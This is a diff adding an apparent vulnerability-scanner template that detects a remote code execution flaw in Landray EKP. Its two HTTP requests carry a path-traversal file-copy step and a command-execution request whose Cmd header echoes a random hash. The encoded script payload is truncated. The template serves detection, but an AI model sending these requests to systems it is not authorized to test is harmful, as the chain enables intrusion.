@@ -1,0 +1,72 @@
+id: landray-ekp-sys-ui-component-rce
+
+info:
+  name: Landray EKP sys_ui_component Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template identifies a remote code execution vulnerability in the Landray EKP sys_ui_component.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: first-request
+    method: POST
+    path:
+      - "/sys/ui/sys_ui_component/sysUiComponent.do"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrSfT4FLCDAu6R1OQ
+      X-Requested-With: XMLHttpRequest
+    body: |
+      ------WebKitFormBoundaryrSfT4FLCDAu6R1OQ
+      Content-Disposition: form-data; name="method"
+
+      replaceExtend
+      ------WebKitFormBoundaryrSfT4FLCDAu6R1OQ
+      Content-Disposition: form-data; name="extendId"
+
+      ../../../../resource/help/km/review/
+      ------WebKitFormBoundaryrSfT4FLCDAu6R1OQ
+      Content-Disposition: form-data; name="folderName"
+
+      ../../../ekp/sys/common
+      ------WebKitFormBoundaryrSfT4FLCDAu6R1OQ--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0"
+          - "1"
+        condition: or
+
+  - id: second-request
+    method: POST
+    path:
+      - "/resource/help/km/review/dataxml.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cmd: "echo {{t2}}"
+    body: |
+      s_bean=ruleFormulaValidate&script=\u0020\u0020\u0020\u0020\u0062\u006f\u006f\u006c\u0065\u0061\u006e\u0020\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0066\u0061\u006c\u0073\u0065\u003b... (truncated for brevity)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Execute:"
+        part: body
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
